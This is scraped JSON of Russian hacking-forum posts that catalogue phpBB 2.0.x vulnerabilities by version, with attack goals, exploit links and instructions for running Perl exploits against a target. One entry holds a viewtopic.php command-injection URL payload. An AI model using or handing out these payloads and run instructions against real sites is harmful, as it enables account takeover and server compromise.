\u0447\u0435\u0440\u0435\u0437 \u043f\u043e\u0438\u0441\u043a \u0437\u0430\u043f\u0440\u043e\u0441\u044b, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0431\u0430\u0437\u0430 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0432\u043e\u0441\u043f\u0440\u0438\u043d\u044f\u0442\u044c. \u0421\u043f\u043b\u043e\u0439\u0442 \u0431\u0435\u0441\u0441\u0438\u043b\u0435\u043d \u0442\u0430\u043c, \u0433\u0434\u0435 \u043d\u0430\u0434\u043e \u0432\u0432\u043e\u0434\u0438\u0442\u044c \u043a\u043e\u0434 (\u0432\u0438\u0437\u0443\u0430\u043b\u044c\u043d\u043e\u0435 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u0435) \u043f\u0440\u0438 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u0438<br>\\nExploit: <a>http:\/\/www.h4cky0u.org\/advisories\/HY...-001-phpbb.txt [out.php?to=http%3A%2F%2Fwww.h4cky0u.org%2Fadvisories%2FHYSA-2006-001-phpbb.txt]\\n\\t\\t\\t\\t\\t<\/a>\\n<br>\\n\\n<br>\\nphpbb &lt;= 2.0.19<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043f\u0430\u0440\u043e\u043b\u044f \u0430\u0434\u043c\u0438\u043d\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u0443\u0434\u0430\u043b\u0435\u043d\u043d\u043e\u043c\u0443 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044e \u043f\u0440\u043e\u0438\u0437\u0432\u0435\u0441\u0442\u0438 \u0431\u0440\u0443\u0442-\u0444\u043e\u0440\u0441 \u0430\u0442\u0430\u043a\u0443.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u0438\u0437-\u0437\u0430 \u0442\u043e\u0433\u043e, \u0447\u0442\u043e \u0444\u0443\u043d\u043a\u0446\u0438\u044f \\\"gen_rand_string()\\\" \u0433\u0435\u043d\u0435\u0440\u0438\u0440\u0443\u0435\u0442 \u0443\u0433\u0430\u0434\u044b\u0432\u0430\u0435\u043c\u044b\u0435 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u0435 \u043d\u043e\u043c\u0435\u0440\u0430. \u0423\u0434\u0430\u043b\u0435\u043d\u043d\u044b\u0439 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043c\u043e\u0436\u0435\u0442 \u0438\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043f\u0430\u0440\u043e\u043b\u044c \u043a \u0446\u0435\u043b\u0435\u0432\u043e\u0439 \u0443\u0447\u0435\u0442\u043d\u043e\u0439 \u0437\u0430\u043f\u0438\u0441\u0438 \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u0444\u0443\u043d\u043a\u0446\u0438\u043e\u043d\u0430\u043b\u0430 \u0432\u043e\u0441\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0430\u0440\u043e\u043b\u044f \u043f\u0443\u0442\u0435\u043c \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438 \u0431\u043e\u043b\u044c\u0448\u043e\u0433\u043e \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0430 \u0437\u0430\u043f\u0440\u043e\u0441\u043e\u0432 \u0434\u043b\u044f \u043f\u043e\u0434\u0431\u043e\u0440\u0430 Validation ID (\u043d\u0435 \u0431\u043e\u043b\u0435\u0435 1000000 \u0437\u0430\u043f\u0440\u043e\u0441\u043e\u0432). \u0414\u043b\u044f \u0443\u0434\u0430\u0447\u043d\u043e\u0439 \u044d\u043a\u0441\u043f\u043b\u0443\u0430\u0442\u0430\u0446\u0438\u0438 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438 \u0437\u043b\u043e\u0443\u043c\u044b\u0448\u043b\u0435\u043d\u043d\u0438\u043a\u0443 \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e \u0437\u043d\u0430\u0442\u044c e-mail \u0446\u0435\u043b\u0435\u0432\u043e\u0439 \u0443\u0447\u0435\u0442\u043d\u043e\u0439 \u0437\u0430\u043f\u0438\u0441\u0438.<br>\\nExploit: <a>http:\/\/milw0rm.com\/exploits\/1382 [out.php?to=http%3A%2F%2Fmilw0rm.com%2Fexploits%2F1382]\\n\\t\\t\\t\\t\\t<\/a>\\n<br>\\n\\n<br>\\nphpbb &lt;= 2.0.20<br>\\n\u0426\u0435\u043b\u044c: DoS \u0444\u043e\u0440\u0443\u043c\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0431\u0430\u043d\u0438\u0442 \u0432\u0441\u0435 \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u044b<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e \u0432 \u0444\u043e\u0440\u0443\u043c\u0435 \u0432\u043a\u043b\u044e\u0447\u0435\u043d \u0431\u0430\u043d \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u0430 \u043f\u0440\u0438 \u0431\u043e\u043b\u0435\u0435 5 \u043d\u0435\u0443\u0434\u0430\u0447\u043d\u044b\u0445 \u043f\u043e\u043f\u044b\u0442\u043e\u043a \u0432\u0445\u043e\u0434\u0430<br>\\nExploit: phpBB 2.0.20 Disable Admin or User Account<br>\\nVideo: -<br>\\n\\n<br>\\nphpBB &lt;= 2.0.21<br>\\n\u0426\u0435\u043b\u044c: \u043a\u043e\u043c\u043f\u0440\u043e\u043c\u0435\u0442\u0430\u0446\u0438\u044f \u0441\u0435\u0440\u0432\u0435\u0440\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: obviously you have no output, but this makes phpbb to be like a http proxy<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0430 \u0432 \u043f\u0435\u0440\u0435\u0432\u043e\u0434\u0435 - phpbb \u043c\u043e\u0436\u043d\u043e \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u043a\u0430\u043a \u043f\u0440\u043e\u043a\u0441\u0438, \u043f\u043e\u0441\u044b\u043b\u0430\u044f \u0437\u0430\u043f\u0440\u043e\u0441 \u0432 \u0443\u0434\u0430\u043b\u0435\u043d\u043d\u043e\u043c \u0443\u0440\u043b\u0435 \u0430\u0432\u0430\u0442\u0430\u0440\u0430; \u0442\u0430\u043a\u0436\u0435 \u0444\u043e\u0440\u0443\u043c \u043d\u0435 \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u0442 \u043a\u043e\u043d\u0442\u0435\u043d\u0442 \u0437\u0430\u0433\u0440\u0443\u0436\u0430\u0435\u043c\u044b\u0445 \u0430\u0432\u0430\u0442\u0430\u0440\u0430\u0445 \u0432 EXIF \u0442\u044d\u0433\u0430\u0445, \u0442\u0443\u0434\u0430 \u043c\u043e\u043d\u0430 \u043f\u043e\u043c\u0435\u0441\u0442\u0438\u0442\u044c PHP-\u043a\u043e\u0434 \u0438 \u043f\u043e\u0442\u043e\u043c \u043a\u0430\u043a\u043d\u0438\u0442\u044c \u043f\u0440\u0438\u0438\u043d\u043a\u043b\u0443\u0434\u0438\u0442\u044c. \u0412\u043e\u0442.<br>\\nExploit: <a>http:\/\/www.securityfocus.com\/archive\/1\/433858 [out.php?to=http%3A%2F%2Fwww.securityfocus.com%2Farchive%2F1%2F433858]\\n\\t\\t\\t\\t\\t<\/a>\\n<br>\\n\\n<br>\\nphpBB &lt;= 2.0.21<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0441\u0435\u0441\u0441\u0438\u0438 \u0430\u0434\u043c\u0438\u043d\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: XSS \u043d\u0430\u043f\u0430\u0434\u0435\u043d\u0438\u0435 \u0438 CSRF \u0430\u0442\u0430\u043a\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: 1)\u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u0438\u0437-\u0437\u0430 \u0442\u043e\u0433\u043e, \u0447\u0442\u043e \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435 \u043d\u0435 \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u0442 \u0432\u0430\u043b\u0438\u0434\u043d\u043e\u0441\u0442\u044c HTTP \u0437\u0430\u043f\u0440\u043e\u0441\u0430 \u043f\u0440\u0438 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0439. 2) \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u0438\u0437-\u0437\u0430 \u043d\u0435\u0434\u043e\u0441\u0442\u0430\u0442\u043e\u0447\u043d\u043e\u0439 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0438 \u0432\u0445\u043e\u0434\u043d\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445 \u0432 \u043f\u043e\u043b\u0435 \\\"Message body\\\" \u0432 \u0441\u0446\u0435\u043d\u0430\u0440\u0438\u0438 privmsg.php.<br>\\nExploit: <a>http:\/\/www.securitylab.ru\/vulnerability\/281494.php [out.php?to=http%3A%2F%2Fwww.securitylab.ru%2Fvulnerability%2F281494.php]\\n\\t\\t\\t\\t\\t<\/a>\\n<\/article>\",\n              \"lastUpdated\": 1533777242312,\n              \"date\": 1206063540000\n            },\n            {\n              \"links\": {\n                \"forum\": {\n                  \"name\": \"prologic.su\",\n                  \"uid\": \"c3e0c62ee91db8dc7382bde7419bb573\",\n                  \"description\": \"\"\n                },\n                \"authorActor\": {\n                  \"handle\": \"###\",\n                  \"uid\": \"b6fed0d4ebdc54efd848b6ae1fe3a90c\"\n                },\n                \"thread\": {\n                  \"uid\": \"9cd32243d9076271b5ef17bbb747283f\",\n                  \"topic\": \"[ \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438 phpbb ]\",\n                  \"count\": 9\n                }\n              },\n              \"uid\": \"3d627a15264ad7407aea0e407f52dd94\",\n              \"message\": \"<article class=\\\"forumPost\\\">\\n\\t\\t\\t\\t\\t\u0420\u0430\u0441\u0441\u043c\u043e\u0442\u0440\u0438\u043c \u043a\u0430\u0436\u0434\u0443\u044e \u0432\u0435\u0440\u0441\u0438\u044e \u0444\u043e\u0440\u0443\u043c\u0430 \u043f\u043e \u043f\u043e\u0440\u044f\u0434\u043a\u0443 \u0438 \u043f\u0440\u043e\u0430\u043d\u0430\u043b\u0438\u0437\u0438\u0440\u0443\u0435\u043c. \u0411\u0443\u0434\u0435\u043c \u0440\u0430\u0441\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u0441 \u0432\u0435\u0440\u0441\u0438\u0438 2.0.4, \u0442.\u043a. \u0432\u0435\u0440\u0441\u0438\u0438 \u043c\u043b\u0430\u0434\u0448\u0435, \u043e\u0431\u0441\u0443\u0436\u0434\u0430\u0442\u044c \u043d\u0435\u0442 \u0441\u043c\u044b\u0441\u043b\u0430.<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.4<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0433\u043e \u0444\u0430\u0439\u043b\u043e\u0432 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0435<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0411\u044b\u043b\u0430 \u0432\u044b\u043f\u0443\u0449\u0435\u043d\u0430 \u0432 2002. \u0414\u0430\u043d\u043d\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f \u043f\u043e\u0447\u0442\u0438 \u043d\u0435 \u043f\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 \u0432 \u0441\u0435\u0442\u0438.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0432\u0445\u043e\u0434\u043d\u044b\u0445 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0432 Admin_Styles.PHP.<br>\\nExploit: ]]&gt;<a>http:\/\/milw0rm.com\/id.php?id=47 [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/milw0rm.com\/id.php?id=47]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.5<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 hash'a \u043f\u0430\u0440\u043e\u043b\u044f<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0412\u044b\u043f\u0443\u0449\u0435\u043d\u0430 \u0432 2002. \u0422\u0430\u043a\u0436\u0435 \u0440\u0435\u0434\u043a\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0412\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u044c \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u043e\u0433\u043e SQL \u0437\u0430\u043f\u0440\u043e\u0441\u0430, \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u0432 \u043f\u0440\u0438 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0435 $topic_id. \u0412\u043e\u0437\u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c 2 \u0437\u0430\u043f\u0440\u043e\u0441, \u0442\u0435\u043c \u0441\u0430\u043c\u044b\u043c \u0437\u0430\u0445\u0432\u0430\u0442\u0438\u0442\u044c \u0445\u044d\u0448.<br>\\nExploit: ]]&gt;<a>http:\/\/milw0rm.com\/id.php?id=44 [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/milw0rm.com\/id.php?id=44]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\n\u041f\u0440\u0438 \u0437\u0430\u043f\u0443\u0441\u043a\u0435 $remote = shift || 'localhost'; - \u0438\u0437\u043c\u0435\u043d\u044f\u0435\u043c \u043d\u0430 \u043d\u0443\u0436\u043d\u044b\u0439 \u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 255.255.255.255, $uid = shift || 2; - ID \u043d\u0443\u0436\u043d\u043e\u0433\u043e \u043d\u0430\u043c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f. \u0412 \u0444\u043e\u0440\u0443\u043c\u0430\u0445 phpBB ID \u0430\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440\u0430 \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e \\\"2\\\". \u0417\u0430\u0442\u0435\u043c \u043f\u0438\u0448\u0435\u043c \\\"perl exp.pl\\\"<br>\\nVideo: -<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.6<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 hash'a \u043f\u0430\u0440\u043e\u043b\u044f<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0412\u044b\u043f\u0443\u0449\u0435\u043d\u0430 \u0432 2002. \u0422\u0430\u043a\u0436\u0435 \u0440\u0435\u0434\u043a\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0412\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u044c \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u043e\u0433\u043e SQL \u0437\u0430\u043f\u0440\u043e\u0441\u0430, \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u0432 \u043c\u043e\u0434\u0443\u043b\u0435 search.php.<br>\\nExploit: ]]&gt;<a>http:\/\/milw0rm.com\/id.php?id=137 [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/milw0rm.com\/id.php?id=137]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\n\u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0435\u043c \\\"perl exp.pl &lt;server&gt; &lt;folder&gt; &lt;user_id&gt; &lt;search_id&gt;\\\"<br>\\n\u0413\u0434\u0435 &lt;server&gt; - ip \u0441\u0435\u0440\u0432\u0435\u0440\u0430 (ip \u0441\u0435\u0440\u0432\u0435\u0440\u0430 \u043c\u043e\u0436\u043d\u043e \u0443\u0437\u043d\u0430\u0442\u044c \u0442\u0430\u043a \u041f\u0443\u0441\u043a-&gt;\u0412\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c-&gt; \u043d\u0430\u0431\u0440\u0430\u0442\u044c cmd, \u0437\u0430\u0442\u0435\u043c \u0432 \u043f\u043e\u044f\u0432\u0438\u0432\u0435\u0448\u043c\u0441\u044f \u043e\u043a\u043d\u0435 \u043d\u0430\u0431\u0440\u0430\u0442\u044c \\\"ping test.com\\\"), &lt;folder&gt; - \u043f\u0430\u043f\u043a\u0430 \u0433\u0434\u0435 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u0441\u0430\u043c \u0444\u043e\u0440\u0443\u043c (\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 \u0435\u0441\u043b\u0438 \u0443 \u043d\u0430\u0441 ]]&gt;<a>http:\/\/123.123.123.123\/forum\/index.php [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/123.123.123.123\/forum\/index.php]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;, \u0432\u043c\u0435\u0441\u0442\u043e &lt;folder&gt; \u043f\u0438\u0448\u0435\u043c forum), &lt;user_id&gt; &lt;search_id&gt; - ID \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f.<br>\\nVideo: ]]&gt;<a>http:\/\/video.anticha...bb_206_sql2.rar [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/video.antichat.net\/videos\/kez\/phpbb_206_sql2.rar]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.8<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u0434\u043c\u0435\u043d\u0430 ip<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0442\u0430\u043a \u0441\u0435\u0431\u0435<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u043f\u043e\u0434\u043c\u0435\u043d\u0438\u0442\u044c ip \u043e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u0435\u043b\u044f \u043d\u0430 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u044b\u0439<br>\\nExploit: ]]&gt;<a>http:\/\/securityvulns...ocument110.html [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/securityvulns.ru\/Gdocument110.html]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\n\\n<br>\\n\\n<b>phpBB 2.0.10<\/b>\\n<br>\\n\u041f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u043c \u0432\u0435\u0440\u0441\u0438\u0438 \u0441 7 \u043f\u043e 9, \u0442.\u043a. \u0432 \u043d\u0438\u0445 \u043f\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 \u0442\u0435 \u0436\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438, \u0447\u0442\u043e \u0438 \u0432 phpBB 2.0.10.<br>\\n\u0426\u0435\u043b\u044c: (1) \u0412\u044b\u043f\u043e\u043b\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u044b\u0445 \u043a\u043e\u043c\u0430\u043d\u0434.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0411\u044b\u043b\u0430 \u0432\u044b\u043f\u0443\u0449\u0435\u043d\u0430 \u0442\u0430\u043a \u0436\u0435 \u0432 2002. \u0414\u0430\u043d\u043d\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f \u0432\u0441\u0442\u0440\u0435\u0447\u0430\u0435\u0442\u0441\u044f \u043d\u0430\u043c\u043d\u043e\u0433\u043e \u0447\u0430\u0449\u0435, \u0447\u0435\u043c \u043c\u043b\u0430\u0434\u0448\u0438\u0435. \u041d\u043e \u0440\u0435\u0436\u0435 \u0447\u0435\u043c \u0441\u0442\u0430\u0440\u0448\u0438\u0435 =). \u0411\u044b\u043b \u043f\u0440\u043e\u0438\u0437\u0432\u0435\u0434\u0451\u043d \u0434\u0435\u0444\u0435\u0439\u0441 \u0441\u0430\u0439\u0442\u0430 phpbb.com, \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u043d\u0430\u0439\u0434\u0435\u043d\u043d\u043e\u0439 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438 \u0432 \u044d\u0442\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0432\u0445\u043e\u0434\u043d\u044b\u0445 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0432 viewtopic.php.<br>\\nExploit: ]]&gt;<a>http:\/\/milw0rm.com\/id.php?id=647 [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/milw0rm.com\/id.php?id=647]\\n\\t\\t\\t\\t\\t<\/a>]]&gt; \u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0442\u044c \\\"perl exp.pl [*URL] [DIR] [NUM] [CMD]\\\"<br>\\n\u0413\u0434\u0435 [*URL] - \u0443\u0440\u043b \u0441\u0430\u0439\u0442\u0430 (\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 ]]&gt;<a>http:\/\/www.test.com) [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/www.test.com)]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;, [DIR] - \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f \u0432 \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u0444\u043e\u0440\u0443\u043c(\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 \/forum\/ \u0438\u043b\u0438 \/forum), [NUM] - \u043d\u043e\u043c\u0435\u0440 \u0442\u043e\u043f\u0438\u043a\u0430 (\u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0435\u0433\u043e), [CMD] - \u043a\u043e\u043c\u0430\u043d\u0434\u0430 \u043a\u043e\u0442\u043e\u0440\u0443\u044e \u0441\u043b\u0435\u0434\u0443\u0435\u0442 \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c (\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 ls -la, \u0441\u043f\u0440\u0430\u0432\u043e\u0447\u043d\u0438\u043a \u0432\u0441\u0435\u0445 \u043a\u043e\u043c\u0430\u043d\u0434 *nix ]]&gt;<a>http:\/\/forum.anticha...7345-1-10.html) [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/forum.antichat.ru\/threadnav7345-1-10.html)]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\nvideo: -<br>\\n\\n<br>\\n\u0426\u0435\u043b\u044c: (2) \u041f\u043e\u043f\u0430\u0434\u0430\u043d\u0438\u0435 \u0432 \u0430\u0434\u043c\u0438\u043d\u043a\u0443 \u043e\u0431\u0445\u043e\u0434\u044f \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u044f.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0432\u0445\u043e\u0434\u043d\u044b\u0445 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0432 Admin_Styles.PHP.<br>\\nExploit: \u0412 \u0430\u0440\u0445\u0438\u0432\u0435 \u0441 \u0432\u0438\u0434\u0435\u043e =)<br>\\nVideo: ]]&gt;<a>http:\/\/video.anticha...ackbbshwizi.rar [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/video.antichat.net\/videos\/wizi\/vhackbbshwizi.rar]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.11<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u0412\u044b\u043f\u043e\u043b\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u044b\u0445 \u043a\u043e\u043c\u0430\u043d\u0434<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0411\u044b\u043b\u0430 \u0432\u044b\u043f\u0443\u0449\u0435\u043d\u0430 \u0442\u0430\u043a \u0436\u0435 \u0432 2002.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0432\u0445\u043e\u0434\u043d\u044b\u0445 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0432 viewtopic.php - \u0433\u043e\u0440\u0435-\u043a\u043e\u0434\u0435\u0440\u044b \u043f\u043b\u043e\u0445\u043e \u0437\u0430\u043f\u0430\u0442\u0447\u0438\u043b\u0438 \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0443\u044e \u0431\u0430\u0433\u0443 - \u0444\u0438\u043b\u044c\u0442\u0440\u0430\u0446\u0438\u044f \u043a\u043e\u0432\u044b\u0447\u043a\u0438 \u043e\u0431\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u043a\u0430\u043a %2527<br>\\nExploit: ]]&gt;<a>http:\/\/www.site.ru\/f...?t=2...ster=`$v [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/www.site.ru\/forum\/viewtopic.php?t=2726&amp;highlight=%2527.%24poster=%60%24v]\\n\\t\\t\\t\\t\\t<\/a>]]&gt; ar%60.%2527&amp;var=id<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.12<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: 